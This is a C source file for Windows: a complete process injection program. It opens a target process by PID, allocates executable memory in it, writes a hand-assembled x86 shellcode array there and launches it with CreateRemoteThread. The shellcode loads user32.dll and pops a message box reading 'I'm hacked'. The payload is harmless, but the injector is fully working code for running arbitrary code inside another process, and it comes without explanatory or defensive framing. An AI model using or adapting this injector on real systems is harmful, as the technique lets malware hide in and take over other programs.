#include <windows.h>

BYTE code[]={
0x55,						//push ebp
0x8B, 0xEC,					//mov ebp, esp

0x83, 0xEC, 0x40,			//sub esp,40
0xC6, 0x45, 0xC0, 0x75,		
0xC6, 0x45, 0xC1, 0x73,
0xC6, 0x45, 0xC2, 0x65,		
0xC6, 0x45, 0xC3, 0x72,
0xC6, 0x45, 0xC4, 0x33,		
0xC6, 0x45, 0xC5, 0x32,
0xC6, 0x45, 0xC6, 0x2E,		
0xC6, 0x45, 0xC7, 0x64,
0xC6, 0x45, 0xC8, 0x6C,		
0xC6, 0x45, 0xC9, 0x6C,
0xC6, 0x45, 0xCA, 0x00,			//0~49bytes	
0x8D, 0x5D, 0xC0,				//lea ebx, dword ptr[ebp-40]
0x53,							//push ebx
0xB8, 0x55, 0xDC, 0x57, 0x77,	//mov eax, LoadLibraryA	55bytes
0xFF, 0xD0,						//call eax				60bytes

0xC6, 0x45, 0xD0, 0x4D,		
0xC6, 0x45, 0xD1, 0x65,
0xC6, 0x45, 0xD2, 0x73,		
0xC6, 0x45, 0xD3, 0x73,
0xC6, 0x45, 0xD4, 0x61,		
0xC6, 0x45, 0xD5, 0x67,
0xC6, 0x45, 0xD6, 0x65,		
0xC6, 0x45, 0xD7, 0x42,
0xC6, 0x45, 0xD8, 0x6F,		
0xC6, 0x45, 0xD9, 0x78,
0xC6, 0x45, 0xDA, 0x41,	
0xC6, 0x45, 0xDB, 0x00,			//108bytes
0x8D, 0x5D, 0xD0,				//lea ebx, dword ptr[ebp-30]
0x53,							//push ebx
0x50,							//push eax
0xB8, 0x84, 0xCC, 0x57, 0x77,	//mov eax, dword ptr[GetProcAddress] 115bytes
0xFF, 0xD0,						//call eax


0xC6, 0x45, 0xE0, 0x49,		
0xC6, 0x45, 0xE1, 0x27,
0xC6, 0x45, 0xE2, 0x6D,		
0xC6, 0x45, 0xE3, 0x20,
0xC6, 0x45, 0xE4, 0x68,		
0xC6, 0x45, 0xE5, 0x61,
0xC6, 0x45, 0xE6, 0x63,		
0xC6, 0x45, 0xE7, 0x6B,
0xC6, 0x45, 0xE8, 0x65,		
0xC6, 0x45, 0xE9, 0x64,
0xC6, 0x45, 0xEA, 0x00,	

0x8D, 0x5D, 0xE0,			//lea ebx, dword ptr[ebp-20]
0x6A, 0x00,					//push 0
0x53,						//push ebx
0x53,						//push ebx
0x6A, 0x00,					//push 0
0xFF, 0xD0,					//call eax
0x83, 0xC4, 0x40,			//add esp, 40

0x8B, 0xE5,					//mov esp, ebp
0x5D,						//pop ebp
0xC3						//ret
};

int do_link_before_inj(PBYTE base)
{
	__asm{
		mov edx, offset code
		mov eax, dword ptr[LoadLibraryA]
		mov dword ptr[edx+0x37], eax
		mov eax, dword ptr[GetProcAddress]
		mov dword ptr[edx+0x73], eax
	}
}



int main(int argc, char *argv[])
{	
    int     PID         = 0;
    HANDLE  hProcess    = 0; 
    PBYTE   pCodeRemote = NULL;
    DWORD   dwNumBytesXferred = 0;
    
    PBYTE   pCode      = NULL;
    DWORD   dwSizeOfCode = 0;
    
    HANDLE  hThread	   = 0;
    DWORD   dwThreadId = 0;
    int	    exitcode   = 0;

    if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
    PID = atoi(argv[1]);
    if (PID <= 0) {
        printf("[E]: pid should be greater than zero!\n"); 
        return -1;
    }
	
    pCode = (PBYTE)code;
    dwSizeOfCode = sizeof(code);

    printf("[I]: Opening remote process %d......", PID); 
    hProcess = OpenProcess(PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_WRITE 
        | PROCESS_VM_READ,
        FALSE, PID);
        
    if (hProcess == NULL) {
        printf("failed.\n"); 
        return -1;
    }   
    printf("ok.\n");

    printf("[I]: Allocating remote memory with size of 0x%08x ......", 
        dwSizeOfCode);

    pCodeRemote = (PBYTE) VirtualAllocEx(hProcess, 
            0, 
            dwSizeOfCode, 
            MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE);		
    if (pCodeRemote == NULL) {
        printf("failed.\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("ok at 0x%08x.\n", pCodeRemote);

//在注入之前首先修改shellcode中系统函数的入口地址
	do_link_before_inj(pCodeRemote);

    printf("[I]: Writing code ......");
    if (WriteProcessMemory(hProcess, 
            pCodeRemote, 
            pCode, 
            dwSizeOfCode, 
            &dwNumBytesXferred) == 0) {
        printf("failed.\n");
        VirtualFreeEx(hProcess, pCodeRemote,
                dwSizeOfCode, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    };
    printf("ok (%d bytes were written).\n", dwNumBytesXferred);
        
    printf("[I]: Creating a remote thread ......");
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
            (LPTHREAD_START_ROUTINE) pCodeRemote,
            pCodeRemote, 0 , &dwThreadId);
    if (hThread == 0) {
        printf("failed.\n");
        if ( pCodeRemote != 0 )	
            VirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);
        if ( hThread != 0 )			
            CloseHandle(hThread);
        return -1;
    }
    printf("ok.\n");
 
    printf("[I]: Waiting the remote thread ......");
    WaitForSingleObject(hThread, INFINITE);
    GetExitCodeThread(hThread, (PDWORD) &exitcode);
    printf("exited with 0x%08X\n", exitcode);
 
    VirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}